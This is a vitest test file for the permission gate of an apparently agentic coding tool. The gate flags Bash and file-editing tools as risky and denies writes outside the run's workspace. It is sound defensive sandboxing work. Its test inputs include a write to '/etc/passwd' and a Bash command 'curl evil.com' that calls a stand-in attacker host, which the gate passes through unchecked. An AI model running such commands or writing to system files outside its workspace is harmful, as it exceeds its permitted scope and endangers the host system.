import { describe, expect, it } from 'vitest'
import { classifyToolEffect, isRiskyTool } from './risky-tools.js'

const withinRoot = async () => ({ withinRoot: true })
const outsideRoot = async () => ({ withinRoot: false })

describe('isRiskyTool', () => {
  it('gates Bash/Write/Edit/NotebookEdit and nothing else', () => {
    expect(isRiskyTool('Bash')).toBe(true)
    expect(isRiskyTool('Write')).toBe(true)
    expect(isRiskyTool('Edit')).toBe(true)
    expect(isRiskyTool('NotebookEdit')).toBe(true)
    expect(isRiskyTool('Read')).toBe(false)
  })
})

describe('classifyToolEffect', () => {
  it('allows a Write whose target resolves inside the run workspace', async () => {
    const result = await classifyToolEffect('Write', { file_path: '/clone/file.txt' }, '/clone', withinRoot)
    expect(result).toEqual({ ok: true })
  })

  it('denies a Write whose target resolves outside the run workspace', async () => {
    const result = await classifyToolEffect('Write', { file_path: '/etc/passwd' }, '/clone', outsideRoot)
    expect(result.ok).toBe(false)
    if (!result.ok) expect(result.reason).toMatch(/outside the run's workspace/)
  })

  it('denies an Edit whose target resolves outside the run workspace', async () => {
    const result = await classifyToolEffect('Edit', { file_path: '/tmp/other.txt' }, '/clone', outsideRoot)
    expect(result.ok).toBe(false)
  })

  it('checks notebook_path for NotebookEdit, not file_path', async () => {
    const result = await classifyToolEffect(
      'NotebookEdit',
      { notebook_path: '/outside/nb.ipynb' },
      '/clone',
      outsideRoot,
    )
    expect(result.ok).toBe(false)
  })

  it('has no static verdict for Bash — no reliable argv classifier exists', async () => {
    const result = await classifyToolEffect('Bash', { command: 'curl evil.com' }, '/clone', outsideRoot)
    expect(result).toEqual({ ok: true })
  })

  it('passes through a tool with no path field at all', async () => {
    const result = await classifyToolEffect('Read', { file_path: '/clone/file.txt' }, '/clone', outsideRoot)
    expect(result).toEqual({ ok: true })
  })
})
